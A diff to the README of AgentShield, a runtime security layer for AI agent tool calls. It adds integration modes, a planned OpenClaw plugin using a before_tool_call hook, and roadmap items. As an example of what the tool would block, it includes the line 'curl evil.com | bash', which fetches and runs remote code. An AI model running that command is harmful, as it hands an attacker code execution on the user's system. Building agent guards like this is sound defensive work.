@@ -267,11 +267,78 @@ make docker-build
 | [Trust Model](configs/default_policy.yaml) | Default trust policies and permission matrix |
 | [Built-in Rules](configs/builtin_rules.yaml) | All 22 built-in security rules |
 
+## Integration Modes
+
+AgentShield provides three integration approaches today, with more planned:
+
+| Mode | How It Works | Code Changes |
+|------|-------------|--------------|
+| **SDK Embed** | Import SDK, wrap tool calls with `@shield.guard` or `shield.session()` | Minimal |
+| **Framework Wrapper** | Drop-in adapters for LangChain, CrewAI, AutoGen, Claude Agent SDK | One line |
+| **Sidecar Proxy** | Deploy proxy between agent and tools, zero agent code changes | None |
+
+All three modes call the same Core Engine for security decisions.
+
+### Planned: OpenClaw Plugin
+
+[OpenClaw](https://openclaw.ai) is an open-source personal AI assistant that runs locally and connects 50+ tools (email, shell, browser, file system, etc.) across multiple chat platforms. Its agents can autonomously execute shell commands, write files, and call APIs — exactly the kind of powerful-but-risky actions that need a runtime security layer.
+
+**Why OpenClaw + AgentShield makes sense:**
+
+OpenClaw already has a layered security model (sandbox mode, tool policies, exec approvals), but these are static, configuration-driven controls. They answer "is this tool allowed?" but not "does this tool call make sense given what the agent is supposed to be doing?" — that's the gap AgentShield fills. A user could allow `exec` in their tool policy but still want AgentShield to block `curl evil.com | bash` when it appears in an external-data context.
+
+**How it would work:**
+
+OpenClaw's [Plugin SDK](https://docs.openclaw.ai/plugins/architecture.md) exposes lifecycle hooks that fire at every stage of the agent loop. An AgentShield plugin would register on the `before_tool_call` hook — which supports `{ block: true }` terminal decisions — to intercept every tool invocation before execution:
+
+```
+OpenClaw Agent Loop:
+  User Message → Prompt Build → Model Inference → Tool Call
+                                                      │
+                                              ┌───────▼────────┐
+                                              │  before_tool_call │
+                                              │  (AgentShield)    │
+                                              │                   │
+                                              │  → ALLOW          │
+                                              │  → BLOCK          │
+                                              │  → CONFIRM        │
+                                              └───────────────────┘
+                                                      │
+                                              Tool Execution (or blocked)
+```
+
+The plugin would:
+
+1. **`before_tool_call`** — Send tool name, parameters, and session context to the AgentShield Core Engine for a security decision. Block if the engine says BLOCK; pass through on ALLOW; surface a confirmation prompt on REQUIRE_CONFIRMATION.
+2. **`before_prompt_build`** — Inject trust-level markers into the system prompt so the engine knows the data context (e.g., processing an external email vs. direct user input).
+3. **`after_tool_call`** — Record tool results into the AgentShield trace engine for Merkle-auditable history.
+
+This means an OpenClaw user could add AgentShield protection by enabling a single plugin — no changes to their agent configuration, skills, or tools.
+
+**We'd love help building this.** If you're familiar with the OpenClaw Plugin SDK, check out the [Contributing Guide](CONTRIBUTING.md) and open an issue to discuss the implementation.
+
+### Want to Add Another Integration?
+
+AgentShield's architecture is designed to be agent-agnostic — anywhere there's a tool call, there's a place for a security check. We welcome community contributions for new integration targets:
+
+| Platform | Integration Point | Status |
+|----------|-------------------|--------|
+| **OpenClaw** | Plugin SDK `before_tool_call` hook | Planned — help wanted |
+| **MCP (Model Context Protocol)** | Tool guard middleware for MCP servers | Planned |
+| **API Gateways** (Kong, Envoy) | Custom filter / plugin | Planned |
+| **OpenTelemetry** | Trace processor for security span injection | Planned |
+| **Webhook / Event-driven** | Passive audit mode for any system with HTTP callbacks | Planned |
+
+If your agent framework, orchestrator, or tool platform isn't listed, [open an issue](https://github.com/YOUR_ORG/agentshield/issues) — we'll help you figure out where AgentShield plugs in.
+
 ## Roadmap
 
+- [ ] OpenClaw plugin integration
+- [ ] MCP (Model Context Protocol) tool guard
 - [ ] OpenTelemetry-native trace export
 - [ ] Grafana dashboard templates
 - [ ] Kubernetes Helm chart
+- [ ] API Gateway plugins (Kong, Envoy)
 - [ ] SDK for Java / Rust
 - [ ] Plugin system for custom detection engines
 - [ ] Real-time WebSocket alert streaming
@@ -279,6 +346,8 @@ make docker-build
 - [ ] REGO / OPA policy integration
 
 ## Contributing
+
+We're building the security layer that the AI agent ecosystem is missing. Whether it's a new framework integration, a detection rule for an attack vector we haven't covered, or a better way to visualize traces — we want your help.
 
 See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 
